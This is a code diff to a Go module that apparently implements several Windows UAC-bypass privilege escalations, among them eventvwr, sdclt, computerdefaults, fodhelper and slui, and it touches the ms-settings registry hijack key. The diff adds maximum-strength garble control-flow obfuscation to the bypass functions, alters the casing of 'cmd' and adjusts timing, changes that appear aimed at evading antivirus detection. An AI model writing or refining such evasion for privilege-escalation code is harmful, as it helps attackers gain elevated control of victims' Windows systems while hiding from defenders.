@@ -12,6 +12,7 @@ import (
 
 // Uacbypass bypasses User Account Control of Windows and escaletes
 // privileges to root if User has root privileges
+//garble:controlflow block_splits=max junk_jumps=max flatten_passes=max flatten_hardening=xor,delegate_table
 func Escalate(path string) (err error) {
 	log.Println("Path for bypass: (", path, ")")
 	version, err := GetVer()
@@ -53,7 +54,8 @@ func Escalate(path string) (err error) {
 
 //// TODO: cleanup Exploits
 
-// eventvwr works on 7, 8, 8.1 fixed in win 10
+// eventvwr works on 7, 8, 8.1 fixed in win 10.
+//garble:controlflow block_splits=max junk_jumps=max flatten_passes=max flatten_hardening=xor,delegate_table
 func eventvwr(path string) (err error) {
 
 	log.Println("eventvwr")
@@ -84,6 +86,7 @@ func eventvwr(path string) (err error) {
 }
 
 // sdcltcontrol works on Win 10
+//garble:controlflow block_splits=max junk_jumps=max flatten_passes=max flatten_hardening=xor,delegate_table
 func sdcltcontrol(path string) error {
 
 	log.Println("sdcltcontrol")
@@ -104,9 +107,9 @@ func sdcltcontrol(path string) error {
 		return err
 	}
 
-	time.Sleep(2 * time.Second)
+	time.Sleep(5 * time.Second)
 
-	cmd = exec.Command("cmd", "/C", "start sdclt.exe")
+	cmd = exec.Command("cMd", "/C", "start sdclt.exe")
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	_, err = cmd.Output()
 	if err != nil {
@@ -158,6 +161,7 @@ func silentCleanUp(path string) (err error) {
 }
 
 // computerdefaults works on Win 10 is more reliable than fodhelper
+//garble:controlflow block_splits=max junk_jumps=max flatten_passes=max flatten_hardening=xor,delegate_table
 func computerdefaults(path string) (err error) {
 	log.Println("computerdefaults")
 	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`, registry.QUERY_VALUE|registry.SET_VALUE)
@@ -230,6 +234,7 @@ func fodhelper(path string) (err error) {
 }
 
 // slui works on Win 8.1, 10
+//garble:controlflow block_splits=max junk_jumps=max flatten_passes=max flatten_hardening=xor,delegate_table
 func slui(path string) (err error) {
 	log.Println("slui")
 
